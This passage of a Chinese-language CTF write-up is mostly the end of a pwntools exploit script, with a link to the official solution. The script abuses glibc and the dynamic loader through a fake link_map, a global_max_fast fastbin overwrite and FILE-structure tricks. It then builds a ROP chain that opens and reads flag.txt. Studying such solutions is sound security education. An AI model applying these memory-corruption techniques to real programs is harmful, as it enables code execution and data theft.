fake_io = io_obj(_rtld_global._dl_load_lock())



########### STEP 5. 為假的 link_map 構造 symbol table ###########
# 記錄我們總共透過 mmap 建立多少 memory
page_mem_alloc = 0
# rip: [_r_debug + 0]
# rdi: _rtld_global._dl_load_lock
def call_func(func, arg=b"", final=False):
    # control l_addr to point to function
    write(binary_map.l_addr(), p64(func - ld.symbols["_r_debug"], signed=True))
    write(_rtld_global._dl_load_lock(), arg)
    enable_fini_function()
    if not final:
        make_mutex_invalid()

def page_boundary(size):
    return (size + 0x1000) >> 12 << 12

# _file._IO_buf_start 會指向 mmap 的 chunk address
def malloc(size):
    assert size % 2 == 0
    old_size = int((size - 100) / 2)

    _file = FileStructure()
    _file._IO_buf_end = old_size
    _file._IO_write_ptr = old_size + 1
    _file._IO_read_ptr = 0xFFFFFFFFFFFFFFFF
    _file._IO_read_end = 0xFFFFFFFFFFFFFFFF
    call_func(libc.symbols["_IO_str_overflow"], bytes(_file)[:0x48])
    make_mutex_invalid()

# 釋放 _file._IO_buf_start 指向的 chunk
def free():
    call_func(libc.symbols["_IO_str_finish"])
  
# global max fast
def gmf_size(offset): 
    # 取得寫入目標與 fastbinsY 的 offset
    off_bt_fastbinY_target = (offset - libc.symbols["main_arena"] - 0x10)
    # 每個 fastbinsY entry 為 0x8 byte，紀錄一個 pointer
    needed_fastbin_entry = off_bt_fastbinY_target // 0x8
    # fastbinsY 紀錄的大小從 0x20 開始 (e.g. 0x20, 0x30, ...)
    needed_fastbin_entry += 2
    # fastbinsY 的每個 entry 都紀錄不同大小的 chunk，而 chunk 每 0x10 為一個單位
    return needed_fastbin_entry * 0x10

meta_hdr_offset = 8
# 在 offset 的地方寫入一個指向 mmap chunk 的 pointer
def ptr_write(offset):
    global page_mem_alloc
    size = gmf_size(offset)
    write(offset, p64(0)) # clear data
    malloc(size)
    # 將 global_max_fast 寫成一個很大的值，代表所有大小的 chunk 都會進入 fastbin 當中
    write(libc.symbols["global_max_fast"], p64(0xFFFFFFFFFFFFFFFF))
    # 後續 mmap 出來的 chunk 會長在前一塊 mmap 出來的 chunk 前面，並且兩者相連
    # 如果能知道 malloc 傳入的大小，就能得知這次 malloc 出來的 chunk 與一開始 mmap 出來的 "chunk" 的 offset 為何
    mmap_chunk = -page_boundary(size) - page_mem_alloc
    mmap_next_chunk = mmap_chunk + size
    write(mmap_chunk - meta_hdr_offset, p64(size | 1)) # set chunk prev_inuse bit
    write(mmap_next_chunk - meta_hdr_offset, p8(0x50)) # set fake chunk size
    page_mem_alloc += page_boundary(size)
    # mmap chunk 會被放到 fastbin 當中，而對應 fastbinsY entry 正好是距離 offset 的位址
    free()
    make_mutex_invalid()
    write(libc.symbols["global_max_fast"], p64(0x80)) # 恢復 global_max_fast
    # 回傳 mmap chunk 與 "chunk" 的 offset
    return -page_mem_alloc

# 為假 link_map 的 Symbol Section 建立一塊空間
symtab_dyn = ptr_write(fake_linkmap.l_info(d_tag['DT_SYMTAB']))
# 確保在 swap 後 _rtld_global._dl_load_lock_._kind 仍是 invalid
write(fake_io._IO_save_end(), p8(0xff))
# _IO_read_end <--> _IO_save_end ; _IO_read_base <--> _IO_save_end ; _IO_read_ptr = 原先的 _IO_save_end
call_func(libc.symbols["_IO_switch_to_backup_area"])
# 將 chunk size 改成 0x200，並 set prev_inuse bit
write(symtab_dyn - meta_hdr_offset, p64(0x200 | 1))
# 清除 FILE flags
write(fake_io._flags(), p64(0))
# free(_IO_save_base)，讓 chunk 再次被釋放，不過這次並非進入 fastbin 當中，而是進入 0x200 tcache bin
call_func(libc.symbols["_IO_free_backup_area"])
# 再次取得 chunk，並且在 chunk 中寫入 pointer，其中包含指向 chunk 的 pointer
call_func(libc.symbols["__open_memstream"])
# 讓 Symbol table 做偏移，使得 Elf64_Dyn.d_un.d_ptr 對應到指向 chunk 的 pointer
write(fake_linkmap.l_info(d_tag['DT_SYMTAB']), p8(0x90))
# 更新 Symbol table 的 offset
symtab = symtab_dyn + 0x110



########### STEP 6. 為假的 link_map 設置其他 table ###########
strtab = ptr_write(fake_linkmap.l_info(d_tag['DT_STRTAB']))
pltgot = ptr_write(fake_linkmap.l_info(d_tag['DT_PLTGOT']))
write(fake_linkmap.l_info(d_tag['DT_JMPREL']), p8(0xf8))
jmprel = ptr_write(ld.symbols["_GLOBAL_OFFSET_TABLE_"]) # d_ptr of DT_JMPREL
fake_linkmap_laddr = ptr_write(fake_linkmap.l_addr())



########### STEP7. 建構 stack pivoting + ORW 的 ROP chain ###########
def rel_write(where, what):
    write(jmprel - 0x10 + 0x18, elf64_rela(where - fake_linkmap_laddr + 0x10, 0x000000007, 0))
    write(symtab - 0x10, elf64_sym(0, 0x12, 1, 0, what - fake_linkmap_laddr + 0x10, 0))
    # rdi: fake_linkmap (l)
    # rsi: 1 (reloc_arg)
    call_func(ld.symbols["_dl_fixup"])

# 0x146110 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
rop_rdi2rdx = libc.address + 0x146110
rop_pop_rdi_ret = libc.address + 0x2daa2
rop_pop_rsi_ret = libc.address + 0x37bca
rop_pop_rdx_ret = libc.address + 0xde622
rop_pop_rax_ret = libc.address + 0x44710
rop_syscall_ret = libc.address + 0x88406
rop_read = libc.symbols["read"]
rop_write = libc.symbols["write"]
rop_exit = libc.symbols["_exit"]
# 讓 [rdi + 8] 拿到 rdi 的位址，也就是 fake link_map
rel_write(_rtld_global._dl_load_lock() + 8, 0)
rel_write(0x20, libc.symbols["setcontext"] + 61)
rel_write(0xA0, 0x100)
rel_write(0xA8, libc.symbols["setcontext"] + 334) # ret
write(ld.symbols["_r_debug"], b"flag.txt\x00")
ROP_chain = [
    rop_pop_rdi_ret, ld.symbols["_r_debug"],
    rop_pop_rsi_ret, 0,
    rop_pop_rdx_ret, 0,
    rop_pop_rax_ret, 2,
    rop_syscall_ret,

    rop_pop_rdi_ret, 3,
    rop_pop_rsi_ret, ld.symbols["_r_debug"],
    rop_pop_rdx_ret, 0x30,
    rop_read,

    rop_pop_rdi_ret, 1,
    rop_write,

    rop_exit,
]

for i in range(len(ROP_chain)):
    if ROP_chain[i] <= 0x30:
        write(0x100 + i*8, p8(ROP_chain[i]))
    else:
        rel_write(0x100 + i*8, ROP_chain[i])

########### STEP8. Win! ###########
call_func(rop_rdi2rdx, b"", True)
flag = r.recvuntil('FLAG{')[-5:]
flag += r.recvuntil('}')
info(f"flag is {flag.decode()}")
r.close()
```







參考：

- [官方解答](https://hackmd.io/@pepsipu/ry-SK44pt)
